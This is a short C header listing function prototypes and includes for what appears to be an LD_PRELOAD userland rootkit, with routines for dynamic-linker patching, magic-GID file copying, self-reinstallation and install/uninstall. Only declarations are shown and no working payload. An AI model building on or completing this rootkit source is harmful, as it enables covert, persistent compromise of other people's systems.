char *sogetplatform(char *sopath);
char *sogetpath(char *sopath);
int socopy(const char *opath, char *npath, gid_t magicgid);
#include "so.c"

#ifdef PATCH_DYNAMIC_LINKER
void ldpatch(const char *path, const char *oldpreload, const char *newpreload, int mode);
#include "ldpatch.c"
#endif

int rknomore(void);
int preloadok(const char *preloadpath);
void reinstall(const char *preloadpath);
#include "reinstall.c"

void bdvinstall(char *const argv[]);
#include "install.c"

void eradicatedir(const char *target);
#ifdef UNINSTALL_MY_ASS
void uninstallass(void);
#endif
void uninstallbdv(void);
#include "uninstall.c"